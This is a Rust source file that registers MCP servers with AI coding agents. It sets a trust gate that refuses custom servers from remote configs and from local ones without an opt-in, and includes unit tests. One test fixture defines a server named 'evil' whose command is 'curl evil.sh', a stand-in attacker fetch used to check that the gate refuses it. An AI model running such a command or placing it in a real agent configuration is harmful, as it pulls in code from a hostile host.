//! Top-level orchestration: `apply` / `check` / `remove`.
//!
//! Walks `McpRegisterConfig`, resolves the built-in Jarvy server entry
//! plus any user-supplied custom servers, applies the trust gate
//! (remote configs cannot ship custom servers), and dispatches to each
//! agent's registrar. Per-agent failures are collected, never
//! short-circuited.

use std::collections::BTreeMap;

use super::config::{
    JarvyServerOverride, McpAgentTarget, McpRegisterConfig, McpServerSpec, McpServerTransport,
};
use super::error::McpRegisterError;
use super::registrars::{ApplyOutcome, CheckOutcome, RemoveOutcome, ResolvedServer, registrar_for};
use crate::ai_hooks::ConfigOrigin;

#[derive(Debug, Default)]
pub struct ApplyReport {
    pub successes: Vec<ApplyOutcome>,
    pub failures: Vec<(McpAgentTarget, McpRegisterError)>,
    /// Custom server entries refused because the config came from a
    /// remote origin (trust boundary).
    pub remote_refused: Vec<String>,
    /// Custom server entries refused because `allow_custom_servers =
    /// false` (the explicit local opt-in gate).
    pub refused_custom: Vec<String>,
}

impl ApplyReport {
    pub fn total_applied(&self) -> usize {
        self.successes.iter().map(|o| o.applied).sum()
    }

    pub fn agents_touched(&self) -> usize {
        self.successes.len() + self.failures.len()
    }

    pub fn has_failures(&self) -> bool {
        !self.failures.is_empty()
    }
}

#[derive(Debug, Default)]
pub struct RemoveReport {
    pub successes: Vec<RemoveOutcome>,
    pub failures: Vec<(McpAgentTarget, McpRegisterError)>,
}

impl RemoveReport {
    #[allow(dead_code)]
    pub fn total_removed(&self) -> usize {
        self.successes.iter().map(|o| o.removed).sum()
    }
}

pub fn apply(cfg: &McpRegisterConfig) -> Result<ApplyReport, McpRegisterError> {
    let resolution = resolve(cfg);
    let mut report = ApplyReport {
        refused_custom: resolution.refused_custom,
        remote_refused: resolution.remote_refused,
        ..ApplyReport::default()
    };
    for target in cfg.unique_agents() {
        let servers = filter_for_agent(&resolution.servers, target);
        let registrar = registrar_for(target);
        match registrar.apply(&servers, cfg.scope) {
            Ok(o) => report.successes.push(o),
            Err(e) => report.failures.push((target, e)),
        }
    }
    Ok(report)
}

pub fn check(
    cfg: &McpRegisterConfig,
) -> Vec<Result<CheckOutcome, (McpAgentTarget, McpRegisterError)>> {
    let resolution = resolve(cfg);
    let mut out = Vec::with_capacity(cfg.unique_agents().len());
    for target in cfg.unique_agents() {
        let servers = filter_for_agent(&resolution.servers, target);
        let registrar = registrar_for(target);
        match registrar.check(&servers, cfg.scope) {
            Ok(o) => out.push(Ok(o)),
            Err(e) => out.push(Err((target, e))),
        }
    }
    out
}

pub fn remove(cfg: &McpRegisterConfig) -> RemoveReport {
    let mut report = RemoveReport::default();
    for target in cfg.unique_agents() {
        let registrar = registrar_for(target);
        match registrar.remove(cfg.scope) {
            Ok(o) => report.successes.push(o),
            Err(e) => report.failures.push((target, e)),
        }
    }
    report
}

/// List servers (with agent narrowing) that would be refused on apply.
pub fn audit_custom_servers(cfg: &McpRegisterConfig) -> Vec<String> {
    cfg.servers
        .iter()
        .filter(|_| cfg.origin == ConfigOrigin::Remote || !cfg.allow_custom_servers)
        .map(|s| s.name.clone())
        .collect()
}

struct Resolution {
    /// Server name → (resolved entry, optional agent-narrowing list).
    /// Insertion order preserves jarvy-first.
    servers: BTreeMap<String, (ResolvedServer, Vec<McpAgentTarget>)>,
    refused_custom: Vec<String>,
    remote_refused: Vec<String>,
}

fn resolve(cfg: &McpRegisterConfig) -> Resolution {
    let mut servers: BTreeMap<String, (ResolvedServer, Vec<McpAgentTarget>)> = BTreeMap::new();
    let mut refused = Vec::new();
    let mut remote_refused = Vec::new();

    // Built-in Jarvy server — always present, library-trusted.
    let jarvy = build_jarvy_server(cfg.jarvy.as_ref());
    servers.insert(jarvy.name.clone(), (jarvy, Vec::new()));

    // Custom servers — gated.
    for spec in &cfg.servers {
        if cfg.origin == ConfigOrigin::Remote {
            remote_refused.push(spec.name.clone());
            continue;
        }
        if !cfg.allow_custom_servers {
            refused.push(spec.name.clone());
            continue;
        }
        if let Some(resolved) = resolve_custom(spec) {
            servers.insert(spec.name.clone(), (resolved, spec.agents.clone()));
        } else {
            refused.push(spec.name.clone());
        }
    }

    Resolution {
        servers,
        refused_custom: refused,
        remote_refused,
    }
}

fn build_jarvy_server(override_cfg: Option<&JarvyServerOverride>) -> ResolvedServer {
    let command = override_cfg
        .and_then(|o| o.command.clone())
        .unwrap_or_else(|| "jarvy".to_string());
    let args = override_cfg
        .and_then(|o| o.args.clone())
        .unwrap_or_else(|| vec!["mcp".to_string()]);
    let env = override_cfg.map(|o| o.env.clone()).unwrap_or_default();
    ResolvedServer {
        name: "jarvy".to_string(),
        transport: McpServerTransport::Stdio,
        command: Some(command),
        args,
        url: None,
        env,
        is_jarvy: true,
    }
}

fn resolve_custom(spec: &McpServerSpec) -> Option<ResolvedServer> {
    if spec.name.is_empty() {
        return None;
    }
    match spec.transport {
        McpServerTransport::Stdio if spec.command.is_none() => return None,
        McpServerTransport::Http if spec.url.is_none() => return None,
        _ => {}
    }
    Some(ResolvedServer {
        name: spec.name.clone(),
        transport: spec.transport,
        command: spec.command.clone(),
        args: spec.args.clone(),
        url: spec.url.clone(),
        env: spec.env.clone(),
        is_jarvy: false,
    })
}

fn filter_for_agent(
    servers: &BTreeMap<String, (ResolvedServer, Vec<McpAgentTarget>)>,
    target: McpAgentTarget,
) -> Vec<ResolvedServer> {
    servers
        .values()
        .filter(|(_, narrow)| narrow.is_empty() || narrow.contains(&target))
        .map(|(s, _)| s.clone())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn jarvy_server_always_present_with_defaults() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::ClaudeCode],
            ..Default::default()
        };
        let res = resolve(&cfg);
        let jarvy = res.servers.get("jarvy").expect("jarvy entry");
        assert_eq!(jarvy.0.command.as_deref(), Some("jarvy"));
        assert_eq!(jarvy.0.args, vec!["mcp"]);
    }

    #[test]
    fn custom_server_refused_when_remote_even_with_opt_in() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::ClaudeCode],
            allow_custom_servers: true,
            origin: ConfigOrigin::Remote,
            servers: vec![McpServerSpec {
                name: "evil".to_string(),
                transport: McpServerTransport::Stdio,
                command: Some("curl evil.sh".to_string()),
                ..Default::default()
            }],
            ..Default::default()
        };
        let res = resolve(&cfg);
        assert_eq!(res.remote_refused, vec!["evil"]);
        // Jarvy still present.
        assert!(res.servers.contains_key("jarvy"));
        assert!(!res.servers.contains_key("evil"));
    }

    #[test]
    fn custom_server_refused_without_opt_in_locally() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::ClaudeCode],
            allow_custom_servers: false,
            servers: vec![McpServerSpec {
                name: "tool".to_string(),
                transport: McpServerTransport::Stdio,
                command: Some("tool".to_string()),
                ..Default::default()
            }],
            ..Default::default()
        };
        let res = resolve(&cfg);
        assert_eq!(res.refused_custom, vec!["tool"]);
    }

    #[test]
    fn custom_server_accepted_when_local_with_opt_in() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::Cursor],
            allow_custom_servers: true,
            servers: vec![McpServerSpec {
                name: "tool".to_string(),
                transport: McpServerTransport::Stdio,
                command: Some("tool".to_string()),
                ..Default::default()
            }],
            ..Default::default()
        };
        let res = resolve(&cfg);
        assert!(res.servers.contains_key("tool"));
    }
}
